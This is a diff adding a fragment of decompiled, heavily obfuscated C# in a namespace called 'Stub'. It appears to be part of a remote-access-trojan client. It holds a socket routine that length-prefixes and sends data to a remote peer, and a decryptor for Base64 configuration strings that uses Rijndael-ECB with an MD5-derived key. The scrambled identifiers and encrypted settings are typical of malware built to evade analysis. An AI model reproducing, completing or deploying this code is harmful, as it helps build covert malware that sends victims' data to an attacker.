@@ -1,0 +1,75 @@
+namespace Stub
+{
+	public class ahHmgkuz8ORgMp6W8dwP2BVzl7GPaVNqXA4SHn2wNaToeUFHapAStTiSJSSU
+	{
+		public static void vqVXIh0cAPEJpOpLXGkNEUTuJru1YjuVnDq8HmLqA993FAFLs5qT5O4tdzWf(string string_0)
+		{
+			object qdLyLMWL4TP9wQTIt8cwJ3JywpjNJG69w931Fuv6qjSg5xkBvIF4j6ykjruR = QdLyLMWL4TP9wQTIt8cwJ3JywpjNJG69w931Fuv6qjSg5xkBvIF4j6ykjruR;
+			ObjectFlowControl.CheckForSyncLockOnValueType(qdLyLMWL4TP9wQTIt8cwJ3JywpjNJG69w931Fuv6qjSg5xkBvIF4j6ykjruR);
+			bool lockTaken = false;
+			try
+			{
+				Monitor.Enter(qdLyLMWL4TP9wQTIt8cwJ3JywpjNJG69w931Fuv6qjSg5xkBvIF4j6ykjruR, ref lockTaken);
+				if (!V2Pb2vDggMWhlbw6j9Z10dicsdHbRzTGGJG5OIZc4cvvemqxdbe0DupaEkv9)
+				{
+					return;
+				}
+				try
+				{
+					using MemoryStream memoryStream = new MemoryStream();
+					byte[] array = eQtA9jB9UGApIpfxSu2M6yq3YGXPo8dlKS.TaoON0lPzugGkQDJJpOWj2j7AY83obFJzo(eQtA9jB9UGApIpfxSu2M6yq3YGXPo8dlKS.aazFldhXL9fVgiRFYnY5pWm1g8kD7uO1y1(string_0));
+					byte[] array2 = eQtA9jB9UGApIpfxSu2M6yq3YGXPo8dlKS.aazFldhXL9fVgiRFYnY5pWm1g8kD7uO1y1(Conversions.ToString(array.Length) + "\0");
+					memoryStream.Write(array2, 0, array2.Length);
+					memoryStream.Write(array, 0, array.Length);
+					duhvUUUtkwSukfOUlvJhoEEo3gqadWiLak7ygcl9LYo5vXeKkj3b72uu53rX.Poll(-1, SelectMode.SelectWrite);
+					duhvUUUtkwSukfOUlvJhoEEo3gqadWiLak7ygcl9LYo5vXeKkj3b72uu53rX.BeginSend(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None, ICuUJJm89csyP2FItaV70sgcbgk0SrXxvKzxDlwrf0PekHjNbvBmqNigflCq, null);
+				}
+				catch (Exception projectError)
+				{
+					ProjectData.SetProjectError(projectError);
+					V2Pb2vDggMWhlbw6j9Z10dicsdHbRzTGGJG5OIZc4cvvemqxdbe0DupaEkv9 = false;
+					ProjectData.ClearProjectError();
+				}
+			}
+			finally
+			{
+				if (lockTaken)
+				{
+					Monitor.Exit(qdLyLMWL4TP9wQTIt8cwJ3JywpjNJG69w931Fuv6qjSg5xkBvIF4j6ykjruR);
+				}
+			}
+		}
+    }
+
+	public class IeTWvOZCjjUM4SxqFvjS7YaWIKvaVZcrfm
+	{
+		public static object CFAiS4x9m385KOpWYifhwh2oem4WTkwE62(string HuNwaelbIAd02Uf7Osd04V3LjXujEawIR0)
+		{
+			RijndaelManaged rijndaelManaged = new RijndaelManaged();
+			MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
+			string text = "";
+			byte[] array = new byte[32];
+			byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(eQtA9jB9UGApIpfxSu2M6yq3YGXPo8dlKS.aazFldhXL9fVgiRFYnY5pWm1g8kD7uO1y1(CrTpu0uWtvIQLEAjFyFYslIE2460DRm5YNFtnuQ788ZduynCZfLbbUjnH5MI.YYbEw6BshcfM18X7vxhaJhozSd4uOgiF43UZFZqkllOQlhobnU1ogVY30Dc0));
+			Array.Copy(sourceArray, 0, array, 0, 16);
+			Array.Copy(sourceArray, 0, array, 15, 16);
+			rijndaelManaged.Key = array;
+			rijndaelManaged.Mode = CipherMode.ECB;
+			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
+			byte[] array2 = Convert.FromBase64String(HuNwaelbIAd02Uf7Osd04V3LjXujEawIR0);
+			return eQtA9jB9UGApIpfxSu2M6yq3YGXPo8dlKS.sz6zNUnyhR2wTCMyYyekxfPw4XXBXMm78l(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
+		}
+	}
+	[StandardModule]
+	internal sealed class eQtA9jB9UGApIpfxSu2M6yq3YGXPo8dlKS
+	{
+		public static byte[] aazFldhXL9fVgiRFYnY5pWm1g8kD7uO1y1(string yTNmYx1x1NlLDxcbYdeBfkJ25H5UYfzpeS)
+		{
+			return Encoding.UTF8.GetBytes(yTNmYx1x1NlLDxcbYdeBfkJ25H5UYfzpeS);
+		}
+
+		public static string sz6zNUnyhR2wTCMyYyekxfPw4XXBXMm78l(byte[] u6JHchyavw4skvJPoFHPwgL8ZqJwX3XbKG)
+		{
+			return Encoding.UTF8.GetString(u6JHchyavw4skvJPoFHPwgL8ZqJwX3XbKG);
+		}
+	}
+}
